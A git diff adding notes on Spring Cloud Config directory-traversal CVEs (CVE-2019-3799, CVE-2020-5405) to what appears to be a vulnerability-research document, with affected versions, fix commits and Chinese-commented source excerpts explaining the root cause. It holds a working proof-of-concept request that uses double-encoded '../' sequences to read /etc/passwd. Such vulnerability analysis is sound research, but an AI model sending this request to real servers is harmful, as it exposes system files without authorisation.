@@ -556,3 +556,52 @@ protected Object doZipTransform(final Message<?> message) throws Exception {
 	}
 }
 ```
+
+## （10）Spring Cloud Config
+### CVE-2019-3799 Directory Traversal
+Affected Version: < 2.1.2 or 2.0.4 or 1.4.6 
+Diff: https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2   
+POC:
+```
+GET /a/b/test/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+```
+Factor: 
+```
+org.springframework.cloud.config.server.resource.ResourceController
+@RequestMapping("/{name}/{profile}/{label}/**")
+public String retrieve(...){
+    String path = getFilePath(request, name, profile, label);  // -> decodeAndCleanUriString()
+    return retrieve(name, profile, label, path, resolvePlaceholders); // -> findOne()
+}
+	
+	
+org.springframework.web.util.UrlPathHelper
+private String decodeAndCleanUriString(HttpServletRequest request, String uri) {
+    uri = this.removeSemicolonContent(uri);  //移除";"号
+    uri = this.decodeRequestString(request, uri); //进行url解码
+    uri = this.getSanitizedPath(uri);  //处理"//"
+    return uri;
+}
+
+org.springframework.cloud.config.server.resource.GenericResourceRepository
+public synchronized Resource findOne(String application, String profile, String label,String path) {
+    String[] locations = this.service.getLocations(application, profile, label).getLocations();
+    try {
+	for (int i = locations.length; i-- > 0;) {
+	String location = locations[i];  // location为远程git地址下载到本地的tmp目录地址
+	for (String local : getProfilePaths(profile, path)) {
+	    Resource file = this.resourceLoader.getResource(location).createRelative(local); // tmp目录地址和label后的内容拼接
+	    if (file.exists() && file.isReadable()) {
+		return file;
+	    }
+	}
+    }
+}
+```
+### CVE-2020-5405 Directory Traversal
+Affected Version: < 2.2.2 or 2.1.7 
+Diff: https://github.com/spring-cloud/spring-cloud-config/commit/651f458919c40ef9a5e93e7d76bf98575910fad0   
+POC:
+```
+```
+
